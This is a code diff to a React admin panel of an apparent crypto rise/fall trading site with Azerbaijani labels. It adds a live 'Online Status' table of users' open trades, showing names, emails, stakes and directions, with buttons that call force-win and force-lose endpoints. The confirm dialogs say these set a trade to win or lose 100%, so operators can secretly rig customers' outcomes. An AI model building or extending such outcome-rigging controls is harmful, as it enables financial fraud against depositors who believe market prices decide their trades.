@@ -9,6 +9,7 @@ export default function Admin() {
   const tabs = [
     ["dashboard", t("admin.tabs.dashboard")],
     ["users", t("admin.tabs.users")],
+    ["online-status", "Online Status"],
     ["deposits", t("admin.tabs.deposits")],
     ["withdrawals", t("admin.tabs.withdrawals")],
     ["wallets", t("admin.tabs.wallets")],
@@ -27,6 +28,7 @@ export default function Admin() {
       </div>
       {tab === "dashboard" && <Dashboard />}
       {tab === "users" && <Users />}
+      {tab === "online-status" && <OnlineStatus />}
       {tab === "deposits" && <Deposits />}
       {tab === "withdrawals" && <Withdrawals />}
       {tab === "wallets" && <Wallets />}
@@ -147,6 +149,125 @@ function BalanceModal({ user, onClose, onUpdated }) {
   );
 }
 
+function OnlineStatus() {
+  const { t } = useTranslation();
+  const [traders, setTraders] = useState([]);
+  const [msg, setMsg] = useState("");
+  const [loading, setLoading] = useState(true);
+
+  const load = async () => {
+    try {
+      const { data } = await api.get("/admin/online-trading");
+      setTraders(data);
+      setLoading(false);
+    } catch (e) {
+      setMsg(formatErr(e));
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    load();
+    const tm = setInterval(load, 3000); // Refresh every 3 seconds
+    return () => clearInterval(tm);
+  }, []);
+
+  const forceWin = async (userId, username) => {
+    if (!window.confirm(`${username} üçün qazancı açmaq istəyirsiniz? (100% qazanacaq)`)) return;
+    try {
+      await api.post(`/admin/users/${userId}/force-win`);
+      setMsg(`✅ ${username} qazandı!`);
+      setTimeout(() => setMsg(""), 3000);
+      load();
+    } catch (e) {
+      setMsg(formatErr(e));
+    }
+  };
+
+  const forceLose = async (userId, username) => {
+    if (!window.confirm(`${username} üçün qazancı bağlamaq istəyirsiniz? (100% uduzacaq)`)) return;
+    try {
+      await api.post(`/admin/users/${userId}/force-lose`);
+      setMsg(`❌ ${username} uduzdu!`);
+      setTimeout(() => setMsg(""), 3000);
+      load();
+    } catch (e) {
+      setMsg(formatErr(e));
+    }
+  };
+
+  if (loading) {
+    return <div className="text-dim">Yüklənir...</div>;
+  }
+
+  return (
+    <div className="panel" data-testid="online-status">
+      <div style={{ padding: 12, display: "flex", gap: 10, alignItems: "center", justifyContent: "space-between" }}>
+        <h3 style={{ margin: 0 }}>🔴 Canlı Trading Edən İstifadəçilər</h3>
+        {msg && <div style={{ fontSize: 13, fontWeight: 600 }} data-testid="online-msg">{msg}</div>}
+      </div>
+      
+      {traders.length === 0 ? (
+        <div style={{ padding: 24, textAlign: "center", color: "var(--text-dim)" }}>
+          Hazırda heç kim trading etmir
+        </div>
+      ) : (
+        <div style={{ overflowX: "auto" }}>
+          <table className="tbl">
+            <thead>
+              <tr>
+                <th>İstifadəçi</th>
+                <th>Email</th>
+                <th>Symbol</th>
+                <th>Məbləğ (USDT)</th>
+                <th>İstiqamət</th>
+                <th>Giriş Qiyməti</th>
+                <th>Əməliyyatlar</th>
+              </tr>
+            </thead>
+            <tbody>
+              {traders.map((trader) => (
+                <tr key={trader.trade_id}>
+                  <td><strong>{trader.username}</strong></td>
+                  <td style={{ fontSize: 12, color: "var(--text-dim)" }}>{trader.email}</td>
+                  <td>
+                    <span className="pill approved">{trader.symbol}</span>
+                  </td>
+                  <td><strong>{fmtMoney(trader.amount_usd, 2)} USDT</strong></td>
+                  <td>
+                    {trader.direction === "rise" ? (
+                      <span style={{ color: "#10b981" }}>📈 Rise</span>
+                    ) : (
+                      <span style={{ color: "#ef4444" }}>📉 Fall</span>
+                    )}
+                  </td>
+                  <td>{fmtMoney(trader.entry_price, 2)}</td>
+                  <td>
+                    <button 
+                      className="btn btn-green btn-sm" 
+                      onClick={() => forceWin(trader.user_id, trader.username)}
+                      data-testid={`win-${trader.user_id}`}
+                      style={{ marginRight: 6 }}>
+                      🟢 Qazancı Aç
+                    </button>
+                    <button 
+                      className="btn btn-red btn-sm" 
+                      onClick={() => forceLose(trader.user_id, trader.username)}
+                      data-testid={`lose-${trader.user_id}`}>
+                      🔴 Qazancı Bağla
+                    </button>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+    </div>
+  );
+}
+
+
 function Users() {
   const { t } = useTranslation();
   const [users, setUsers] = useState([]);
@@ -164,15 +285,6 @@ function Users() {
   const ban = async (id, banned) => {
     try { await api.post(`/admin/users/${id}/${banned ? "unban" : "ban"}`); load(); }
     catch (e) { setMsg(formatErr(e)); }
-  };
-
-  const toggleTrading = async (id) => {
-    try {
-      const res = await api.post(`/admin/users/${id}/toggle-trading`);
-      setMsg(`Trading ${res.data.trading_enabled ? "enabled" : "disabled"}.`);
-      setTimeout(() => setMsg(""), 3000);
-      load();
-    } catch (e) { setMsg(formatErr(e)); }
   };
 
   const onUpdated = (updatedUser) => {
@@ -199,7 +311,7 @@ function Users() {
           <thead>
             <tr>
               <th>{t("admin.email")}</th><th>{t("admin.username")}</th><th>{t("admin.role")}</th>
-              <th>{t("admin.balances")}</th><th>{t("admin.status")}</th><th>Trading</th><th>{t("admin.actions")}</th>
+              <th>{t("admin.balances")}</th><th>{t("admin.status")}</th><th>{t("admin.actions")}</th>
             </tr>
           </thead>
           <tbody>
@@ -213,17 +325,6 @@ function Users() {
                 </td>
                 <td>
                   {u.banned ? <span className="pill rejected">{t("admin.banned")}</span> : <span className="pill approved">{t("admin.active")}</span>}
-                </td>
-                <td>
-                  {u.role !== "admin" ? (
-                    <button
-                      className={`btn btn-sm ${u.trading_enabled ? "btn-green" : "btn-ghost"}`}
-                      onClick={() => toggleTrading(u.id)}
-                      data-testid={`toggle-trading-${u.id}`}
-                      title={u.trading_enabled ? "Click to disable trading" : "Click to enable trading"}>
-                      {u.trading_enabled ? "Enabled" : "Disabled"}
-                    </button>
-                  ) : "—"}
                 </td>
                 <td>
                   {u.role !== "admin" && (
